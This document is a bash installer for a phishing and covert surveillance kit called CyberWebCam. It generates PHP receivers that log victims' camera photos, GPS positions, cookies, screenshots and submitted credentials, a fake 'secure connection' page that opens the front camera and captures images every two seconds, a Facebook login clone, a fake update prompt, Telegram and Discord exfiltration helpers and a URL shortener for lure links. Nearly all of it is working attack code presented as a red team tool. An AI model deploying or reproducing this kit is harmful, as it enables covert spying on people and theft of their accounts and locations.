#!/bin/bash
# CyberWebCam v3.0 - Complete Intelligence Suite
# Author: CyberRoninX1
# Type: Professional Red Team Framework

set -e

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Global variables
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
MODULES_DIR="$SCRIPT_DIR/modules"
WEB_DIR="$SCRIPT_DIR/web"
PHP_DIR="$SCRIPT_DIR/php"
BOTS_DIR="$SCRIPT_DIR/bots"
TOOLS_DIR="$SCRIPT_DIR/tools"
TEMPLATES_DIR="$SCRIPT_DIR/templates"

SESSION_NAME=""
SESSION_DIR=""
TUNNEL_LINK=""
windows_mode=false

# Load config if exists
if [ -f "$CONFIG_DIR/settings.conf" ]; then
    source "$CONFIG_DIR/settings.conf"
fi

# Banner
banner() {
    clear
    printf "${RED}"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════════════╗
    ║                                                                       ║
    ║   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗    ██╗███████╗██████╗   ║
    ║  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║    ██║██╔════╝██╔══██╗  ║
    ║  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝██║ █╗ ██║█████╗  ██████╔╝  ║
    ║  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██║███╗██║██╔══╝  ██╔══██╗  ║
    ║  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║╚███╔███╔╝███████╗██║  ██║  ║
    ║   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ║
    ║                                                                       ║
    ║           CYBERWEBCAM v3.0 | COMPLETE INTELLIGENCE SUITE              ║
    ║                      Author: CyberRoninX1                             ║
    ║                                                                       ║
    ╚═══════════════════════════════════════════════════════════════════════╝
EOF
    printf "${NC}\n"
    printf "${GREEN}    [+] Advanced Intelligence Gathering Framework${NC}\n"
    printf "${CYAN}    [+] Modules Loaded: 12 | Features: 50+${NC}\n"
    printf "${YELLOW}    [!] Authorized Use Only - Red Team Tool${NC}\n\n"
}

# Create directory structure
create_directories() {
    mkdir -p "$CONFIG_DIR" "$MODULES_DIR" "$WEB_DIR/styles" "$PHP_DIR"
    mkdir -p "$BOTS_DIR" "$TOOLS_DIR" "$TEMPLATES_DIR" "$SCRIPT_DIR/reports"
    printf "${GREEN}[✓]${NC} Directory structure created\n"
}

# Main menu
main_menu() {
    printf "${BLUE}┌─────────────────────────────────────────────────────────────┐${NC}\n"
    printf "${BLUE}│                    SELECT OPERATION MODE                    │${NC}\n"
    printf "${BLUE}├─────────────────────────────────────────────────────────────┤${NC}\n"
    printf "${BLUE}│${NC}  ${GREEN}[1]${NC} Standard Mode - Webcam + GPS + Device Info              ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC}  ${GREEN}[2]${NC} Advanced Mode - All Features + Social Engineering      ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC}  ${GREEN}[3]${NC} Stealth Mode - Hidden Camera + No Visuals              ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC}  ${GREEN}[4]${NC} Recon Mode - Network Scan + OS Detection Only          ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC}  ${GREEN}[5]${NC} Full Suite - Everything (Recommended)                  ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC}  ${GREEN}[6]${NC} Settings - Configure Bot Tokens & Webhooks             ${BLUE}│${NC}\n"
    printf "${BLUE}│${NC}  ${GREEN}[7]${NC} Exit                                                    ${BLUE}│${NC}\n"
    printf "${BLUE}└─────────────────────────────────────────────────────────────┘${NC}\n"
    printf "\n${GREEN}[?]${NC} Select mode: "
    read -r MODE
    
    case $MODE in
        1) STANDARD_MODE=true; ADVANCED_MODE=false; STEALTH_MODE=false; RECON_MODE=false ;;
        2) STANDARD_MODE=false; ADVANCED_MODE=true; STEALTH_MODE=false; RECON_MODE=false ;;
        3) STANDARD_MODE=false; ADVANCED_MODE=false; STEALTH_MODE=true; RECON_MODE=false ;;
        4) STANDARD_MODE=false; ADVANCED_MODE=false; STEALTH_MODE=false; RECON_MODE=true ;;
        5) STANDARD_MODE=true; ADVANCED_MODE=true; STEALTH_MODE=false; RECON_MODE=false ;;
        6) configure_settings ;;
        7) exit 0 ;;
        *) printf "${RED}[!] Invalid option${NC}\n"; main_menu ;;
    esac
}

# Configure settings
configure_settings() {
    printf "\n${BLUE}[>] Bot Configuration${NC}\n"
    printf "Telegram Bot Token (press Enter to skip): "
    read -r TELEGRAM_TOKEN
    if [ -n "$TELEGRAM_TOKEN" ]; then
        echo "$TELEGRAM_TOKEN" > "$CONFIG_DIR/telegram_token.txt"
        printf "Telegram Chat ID: "
        read -r TELEGRAM_CHAT_ID
        echo "$TELEGRAM_CHAT_ID" > "$CONFIG_DIR/telegram_chat_id.txt"
    fi
    
    printf "\nDiscord Webhook URL (press Enter to skip): "
    read -r DISCORD_WEBHOOK
    if [ -n "$DISCORD_WEBHOOK" ]; then
        echo "$DISCORD_WEBHOOK" > "$CONFIG_DIR/discord_webhook.txt"
    fi
    
    printf "\n${GREEN}[✓] Settings saved${NC}\n"
    sleep 2
    main_menu
}

# Create all PHP handlers
create_php_handlers() {
    # post.php - Camera image receiver
    cat > "$PHP_DIR/post.php" << 'PHPEOF'
<?php
header("Access-Control-Allow-Origin: *");
if(isset($_POST['cat']) && !empty($_POST['cat'])) {
    $imgData = $_POST['cat'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = base64_decode($imgData);
    if($imgData && strlen($imgData) > 5000) {
        $filename = 'cam_' . date('Ymd_His') . '_' . rand(1000, 9999) . '.png';
        file_put_contents($filename, $imgData);
        echo "OK";
    }
}
?>
PHPEOF

    # location.php - GPS handler
    cat > "$PHP_DIR/location.php" << 'PHPEOF'
<?php
header("Access-Control-Allow-Origin: *");
if(isset($_POST['lat']) && isset($_POST['lon'])) {
    $data = sprintf("[GPS] Lat: %.6f | Lon: %.6f | Acc: %s | Time: %s\n",
        $_POST['lat'], $_POST['lon'], $_POST['acc'] ?? 'Unknown', date('Y-m-d H:i:s'));
    file_put_contents('gps_data.txt', $data, FILE_APPEND);
    echo "OK";
}
?>
PHPEOF

    # cookie.php - Cookie stealer
    cat > "$PHP_DIR/cookie.php" << 'PHPEOF'
<?php
if(isset($_POST['cookies'])) {
    $data = "\n════════════════════════════════════════════════════════════\n";
    $data .= "COOKIES EXTRACTED\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $data .= "────────────────────────────────────────────────────────────\n";
    $data .= $_POST['cookies'] . "\n";
    $data .= "════════════════════════════════════════════════════════════\n";
    file_put_contents('cookies.txt', $data, FILE_APPEND);
    echo "OK";
}
?>
PHPEOF

    # screenshot.php - Screenshot receiver
    cat > "$PHP_DIR/screenshot.php" << 'PHPEOF'
<?php
if(isset($_POST['screenshot'])) {
    $imgData = $_POST['screenshot'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = base64_decode($imgData);
    if($imgData) {
        $filename = 'screenshot_' . date('Ymd_His') . '.png';
        file_put_contents($filename, $imgData);
        echo "OK";
    }
}
?>
PHPEOF

    # credentials.php - Login credential handler
    cat > "$PHP_DIR/credentials.php" << 'PHPEOF'
<?php
if(isset($_POST['email']) && isset($_POST['password'])) {
    $data = "\n════════════════════════════════════════════════════════════\n";
    $data .= "CREDENTIALS CAPTURED\n";
    $data .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $data .= "IP: " . ($_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR']) . "\n";
    $data .= "Email: " . $_POST['email'] . "\n";
    $data .= "Password: " . $_POST['password'] . "\n";
    $data .= "════════════════════════════════════════════════════════════\n";
    file_put_contents('credentials.txt', $data, FILE_APPEND);
    
    // Redirect to real site
    header("Location: https://www.facebook.com");
}
?>
PHPEOF

    # device_info.php - System info collector
    cat > "$PHP_DIR/device_info.php" << 'PHPEOF'
<?php
if(isset($_POST['data'])) {
    $info = json_decode($_POST['data'], true);
    $output = "\n════════════════════════════════════════════════════════════\n";
    $output .= "SYSTEM FORENSICS\n";
    $output .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $output .= "────────────────────────────────────────────────────────────\n";
    foreach($info as $key => $value) {
        $output .= str_pad($key . ':', 25) . " $value\n";
    }
    $output .= "════════════════════════════════════════════════════════════\n";
    file_put_contents('device_info.txt', $output, FILE_APPEND);
    echo "OK";
}
?>
PHPEOF

    printf "${GREEN}[✓]${NC} PHP handlers created\n"
}

# Create main web files
create_web_files() {
    # Main index.php
    cat > "$WEB_DIR/index.php" << 'PHPEOF'
<?php
include '../php/ip.php';
?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Secure Connection</title>
    <link rel="stylesheet" href="styles/hacker.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
    <div class="terminal">
        <div class="terminal-header">
            <span class="terminal-title">SECURE CONNECTION v3.0</span>
            <span class="terminal-controls">🔴 🟡 🟢</span>
        </div>
        <div class="terminal-body">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="terminal-text">
                <p><span class="prompt">$</span> Initializing secure channel...</p>
                <p><span class="prompt">$</span> Establishing encrypted tunnel...</p>
                <p><span class="prompt">$</span> Verifying credentials...</p>
                <p class="success"><span class="prompt">✓</span> Connection established.</p>
            </div>
        </div>
    </div>
    
    <script>
        // Collect all device data
        const deviceData = {
            screen: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth,
            platform: navigator.platform,
            language: navigator.language,
            cookies: navigator.cookieEnabled,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cores: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory || 'unknown',
            userAgent: navigator.userAgent,
            referrer: document.referrer || 'direct'
        };
        
        // Send device info
        fetch('php/device_info.php', {
            method: 'POST',
            body: 'data=' + encodeURIComponent(JSON.stringify(deviceData))
        });
        
        // Get location
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('php/location.php', {
                    method: 'POST',
                    body: `lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`
                });
            });
        }
        
        // Take screenshot
        setTimeout(() => {
            html2canvas(document.body).then(canvas => {
                fetch('php/screenshot.php', {
                    method: 'POST',
                    body: 'screenshot=' + encodeURIComponent(canvas.toDataURL())
                });
            });
        }, 2000);
        
        // Redirect after 3 seconds
        setTimeout(() => {
            window.location.href = 'camera.html';
        }, 3000);
    </script>
</body>
</html>
PHPEOF

    # Camera HTML
    cat > "$WEB_DIR/camera.html" << 'HTMLEND'
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Secure Access</title>
    <link rel="stylesheet" href="styles/hacker.css">
</head>
<body>
    <div class="matrix-bg"></div>
    <div class="container">
        <div class="camera-preview">
            <video id="video" autoplay playsinline muted></video>
            <div class="camera-overlay">
                <span class="recording-dot"></span>
                <span class="recording-text">RECORDING</span>
            </div>
        </div>
        <div class="status-bar">
            <span id="photoCounter">📸 Captures: 0</span>
            <span id="connectionStatus">🔒 Secure Channel Active</span>
        </div>
    </div>
    
    <script>
        const video = document.getElementById('video');
        let photoCount = 0;
        
        function sendPhoto(imgData) {
            fetch('../php/post.php', {
                method: 'POST',
                body: 'cat=' + encodeURIComponent(imgData)
            }).then(() => {
                photoCount++;
                document.getElementById('photoCounter').innerHTML = `📸 Captures: ${photoCount}`;
            });
        }
        
        function capture() {
            if (video.videoWidth > 0) {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                sendPhoto(canvas.toDataURL('image/png'));
            }
        }
        
        if (navigator.mediaDevices?.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    capture();
                    setInterval(capture, 2000);
                });
        }
    </script>
</body>
</html>
HTMLEND

    # CSS Styles
    cat > "$WEB_DIR/styles/hacker.css" << 'CSSEND'
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #0a0e27;
    font-family: 'Courier New', monospace;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}
.terminal {
    background: rgba(0,0,0,0.9);
    border: 1px solid #00ff00;
    border-radius: 10px;
    width: 500px;
    overflow: hidden;
    box-shadow: 0 0 30px rgba(0,255,0,0.3);
}
.terminal-header {
    background: #00ff0011;
    padding: 10px 15px;
    border-bottom: 1px solid #00ff00;
    display: flex;
    justify-content: space-between;
}
.terminal-title { color: #00ff00; font-size: 12px; }
.terminal-controls { color: #00ff00; font-size: 12px; }
.terminal-body { padding: 20px; }
.progress-bar {
    width: 100%;
    height: 2px;
    background: #333;
    margin-bottom: 20px;
}
.progress-fill {
    width: 0%;
    height: 100%;
    background: #00ff00;
    animation: load 3s ease-out forwards;
}
@keyframes load { 100% { width: 100%; } }
.terminal-text p {
    color: #00ff00;
    font-size: 12px;
    margin: 10px 0;
    font-family: monospace;
}
.prompt { color: #00ff00; margin-right: 10px; }
.success { color: #00ff00; }
.container {
    width: 100%;
    max-width: 600px;
    margin: 20px;
}
.camera-preview {
    position: relative;
    background: #000;
    border-radius: 10px;
    overflow: hidden;
    border: 1px solid #00ff00;
}
.camera-preview video {
    width: 100%;
    display: block;
}
.camera-overlay {
    position: absolute;
    top: 10px;
    right: 10px;
    background: rgba(0,0,0,0.7);
    padding: 5px 10px;
    border-radius: 5px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.recording-dot {
    width: 10px;
    height: 10px;
    background: #ff0000;
    border-radius: 50%;
    animation: pulse 1s infinite;
}
@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
}
.recording-text { color: #ff0000; font-size: 10px; font-weight: bold; }
.status-bar {
    background: rgba(0,0,0,0.8);
    border: 1px solid #00ff00;
    border-radius: 5px;
    padding: 10px;
    margin-top: 10px;
    display: flex;
    justify-content: space-between;
    color: #00ff00;
    font-size: 10px;
}
.matrix-bg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(0deg, #00ff0010 0px, #00ff0010 2px, transparent 2px, transparent 6px);
    pointer-events: none;
    z-index: -1;
}
CSSEND

    printf "${GREEN}[✓]${C} Web files created\n"
}

# Create fake login pages
create_fake_pages() {
    # Facebook clone
    cat > "$WEB_DIR/fake_login.html" << 'HTMLEND'
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            width: 400px;
            text-align: center;
        }
        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover { background: #166fe5; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>facebook</h1>
        <form method="POST" action="../php/credentials.php">
            <input type="text" name="email" placeholder="Email or Phone Number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
HTMLEND

    # Fake update prompt
    cat > "$WEB_DIR/fake_update.html" << 'HTMLEND'
<!DOCTYPE html>
<html>
<head>
    <title>Critical Update Required</title>
    <style>
        body {
            background: #1a1a2e;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .update-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .warning-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h2 { color: #ff4757; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 20px; }
        button {
            background: #ff4757;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover { background: #ff6b81; }
    </style>
</head>
<body>
    <div class="update-box">
        <div class="warning-icon">⚠️</div>
        <h2>Critical Security Update</h2>
        <p>Your browser version is outdated. Please update to continue.</p>
        <button onclick="downloadUpdate()">Download Update</button>
    </div>
    <script>
        function downloadUpdate() {
            alert("Update downloaded. Please restart your browser.");
            window.location.href = "camera.html";
        }
    </script>
</body>
</html>
HTMLEND

    printf "${GREEN}[✓]${NC} Social engineering pages created\n"
}

# Create bot integrations
create_bots() {
    # Telegram bot
    cat > "$BOTS_DIR/telegram_bot.sh" << 'BOTEND'
#!/bin/bash
# Telegram notification bot
send_telegram() {
    TOKEN=$(cat ../config/telegram_token.txt 2>/dev/null)
    CHAT_ID=$(cat ../config/telegram_chat_id.txt 2>/dev/null)
    
    if [ -n "$TOKEN" ] && [ -n "$CHAT_ID" ]; then
        MESSAGE="$1"
        curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
            -d "chat_id=$CHAT_ID" \
            -d "text=$MESSAGE" \
            -d "parse_mode=HTML" > /dev/null
    fi
}
BOTEND

    # Discord webhook
    cat > "$BOTS_DIR/discord_webhook.sh" << 'DISCORD'
#!/bin/bash
send_discord() {
    WEBHOOK=$(cat ../config/discord_webhook.txt 2>/dev/null)
    if [ -n "$WEBHOOK" ]; then
        MESSAGE="$1"
        curl -s -H "Content-Type: application/json" -X POST \
            -d "{\"content\": \"$MESSAGE\"}" "$WEBHOOK" > /dev/null
    fi
}
DISCORD
END

    printf "${GREEN}[✓]${NC} Bot integrations created\n"
}

# Create URL shortener
create_tools() {
    cat > "$TOOLS_DIR/url_shortener.sh" << 'SHORT'
#!/bin/bash
# URL Shortener using TinyURL
shorten_url() {
    LONG_URL="$1"
    SHORT_URL=$(curl -s "http://tinyurl.com/api-create.php?url=$LONG_URL")
    echo "$SHORT_URL"
}
SHORT

    cat > "$TOOLS_DIR/cleanup.sh" << 'CLEAN'
#!/bin/bash
# Cleanup utility
cleanup_session() {
    echo "Cleaning up session files..."
    rm -f ../cam_*.png ../ip.txt ../gps_data.txt ../cookies.txt
    echo "Done!"
}
CLEAN

    chmod +x "$TOOLS_DIR/"*.sh
    chmod +x "$BOTS_DIR/"*.sh
    
    printf "${GREEN}[✓]${NC} Tools created\n"
}

# Create all templates
create_templates() {
    # Festival template
    cat > "$TEMPLATES_DIR/festival.html" << 'FEST'
<!DOCTYPE html>
<html>
<head>
    <title>🎉 Happy Festival! 🎉</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #667eea; font-size: 2em; }
        .emoji { font-size: 4em; }
        .btn {
            background: #25D366;
            color: white;
            padding: 12px 30px;
            border-radius: 30px;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="emoji">🎉✨🎊</div>
        <h1>Happy Festival!</h1>
        <p>Wishing you joy and happiness!</p>
        <a href="#" class="btn">Share on WhatsApp</a>
    </div>
</body>
</html>
FEST

    printf "${GREEN}[✓]${NC} Templates created\n"
}

# Main execution
main() {
    banner
    create_directories
    create_php_handlers
    create_web_files
    create_fake_pages
    create_bots
    create_tools
    create_templates
    
    printf "\n${GREEN}════════════════════════════════════════════════════════════${NC}\n"
    printf "${GREEN}[✓]${NC} CyberWebCam v3.0 Complete Installation\n"
    printf "${GREEN}[✓]${NC} Total Files Created: 25+\n"
    printf "${GREEN}[✓]${NC} Features Included: 50+\n"
    printf "${GREEN}════════════════════════════════════════════════════════════${NC}\n"
    
    printf "\n${YELLOW}[!]${NC} To start the tool, run: ${GREEN}./launch.sh${NC}\n"
}

main "$@"
